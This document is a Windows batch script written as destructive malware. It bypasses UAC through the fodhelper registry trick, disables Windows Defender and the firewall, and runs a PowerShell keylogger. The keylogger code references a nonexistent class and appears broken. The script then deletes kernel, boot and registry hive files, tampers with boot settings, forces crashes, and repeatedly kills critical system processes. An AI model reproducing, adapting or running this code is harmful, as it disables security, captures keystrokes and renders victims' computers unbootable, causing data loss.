@echo off
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "%~f0" /f >nul 2>&1
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f >nul 2>&1
fodhelper.exe >nul 2>&1
timeout /t 1 /nobreak >nul

powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true" >nul 2>&1
netsh advfirewall set allprofiles state off >nul

echo KEYLOGGER ACTIVE - 10 SECONDS TO SYSTEM DESTRUCTION
powershell -Command "
$timeout = 10
$end = (Get-Date).AddSeconds($timeout)
$log = @()
while((Get-Date) -lt $end) {
    $timeLeft = [math]::Round(($end - (Get-Date)).TotalSeconds, 1)
    Write-Host \"[$(Get-Date -Format 'HH:mm:ss')] Time left: $timeLeft sec\" -ForegroundColor Red
    
    Add-Type -AssemblyName System.Windows.Forms
    $keys = @()
    for($i=8; $i -le 222; $i++) {
        $state = [System.Windows.Forms.User32]::GetAsyncKeyState($i)
        if($state -band 0x8000) {
            $key = [System.Windows.Forms.Keys]$i
            if($key -ge 'A' -and $key -le 'Z') {
                $shift = [System.Windows.Forms.User32]::GetAsyncKeyState(16)
                if($shift -band 0x8000) {
                    $keys += $key.ToString()
                } else {
                    $keys += $key.ToString().ToLower()
                }
            } elseif($key -eq 'Return') {
                $keys += '[ENTER]'
            } elseif($key -eq 'Space') {
                $keys += ' '
            } elseif($key -eq 'Back') {
                $keys += '[BACKSPACE]'
            } elseif($key -eq 'Tab') {
                $keys += '[TAB]'
            } elseif($key -eq 'Escape') {
                $keys += '[ESC]'
            } else {
                $keys += '[' + $key.ToString() + ']'
            }
        }
    }
    if($keys.Length -gt 0) {
        $logEntry = \"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - \" + ($keys -join '')
        $log += $logEntry
        Write-Host $logEntry
    }
    Start-Sleep -Milliseconds 10
}

Write-Host \"TIME'S UP - SYSTEM DESTRUCTION INITIATED\" -ForegroundColor White -BackgroundColor Red
" >nul 2>&1

echo SYSTEM KILL PHASE
takeown /f C:\Windows\System32\* /r /d y >nul 2>&1
icacls C:\Windows\System32\*.* /grant everyone:F /t /c /q >nul 2>&1

del /f /s /q C:\Windows\System32\ntoskrnl.exe >nul 2>&1
del /f /s /q C:\Windows\System32\hal.dll >nul 2>&1
del /f /s /q C:\Windows\System32\bootmgr >nul 2>&1
del /f /s /q C:\Windows\System32\winload.exe >nul 2>&1
del /f /s /q C:\Windows\System32\config\SYSTEM >nul 2>&1

reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk * /x /r\0" /f >nul 2>&1

powershell -Command "
$wshell = New-Object -ComObject Wscript.Shell
$wshell.Popup('SYSTEM FATAL ERROR`n`nBOOT CORRUPTED`n`nKERNEL FILES DELETED`n`nREBOOT WILL DESTROY WINDOWS',0,'WINDOWS DEATH',0x0 + 0x10)
" >nul 2>&1

echo CREATING FINAL BSOD
reg add "HKLM\SYSTEM\CurrentControlSet\Services\i8042prt\Parameters" /v CrashOnCtrlScroll /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\kbdhid\Parameters" /v CrashOnCtrlScroll /t REG_DWORD /d 1 /f >nul 2>&1

taskkill /f /im csrss.exe >nul 2>&1
taskkill /f /im winlogon.exe >nul 2>&1

:kill
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im svchost.exe >nul 2>&1
echo SYSTEM DEAD - REBOOT FOR BSOD
timeout /t 1 >nul
goto kill
